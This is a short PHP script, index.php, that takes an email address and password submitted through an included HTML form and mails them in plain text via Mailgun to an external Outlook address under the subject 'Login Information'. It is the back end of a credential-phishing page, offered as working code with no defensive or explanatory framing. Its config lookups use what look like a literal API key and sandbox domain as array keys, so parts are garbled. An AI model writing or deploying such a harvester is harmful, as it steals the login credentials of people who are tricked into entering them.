<?php
// index.php
require 'vendor/autoload.php';

use Mailgun\Mailgun;

// Load configuration safely
$config = include 'config.php'; // This should contain your API key and Domain

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Mailgun configuration
    $mgClient = Mailgun::create($config['5e63e616ce3be04ab046bedce0e56335']);
    $domain = $config['sandbox200e5e5e6ffe412b95ec54b9d213e1f0.mailgun.org'];

    $subject = 'Login Information';
    $message = "Email: $email\nPassword: $password";

    // Send the email
    try {
        $result = $mgClient->messages()->send($domain, [
            'from'    => 'postmaster@sandbox1234567890abcdef.mailgun.org',
            'to'      => 'Opal.EphTv.Networks@outlook.com',
            'subject' => $subject,
            'text'    => $message
        ]);
        echo 'Email sent successfully: ' . $result->getId(); // Optional: Output the result
    } catch (Exception $e) {
        echo 'Failed to send email. Error: ' . $e->getMessage();
    }
} else {
    echo 'Invalid request. Please use POST method.';
}

// Include the HTML form for input
include 'form.html';
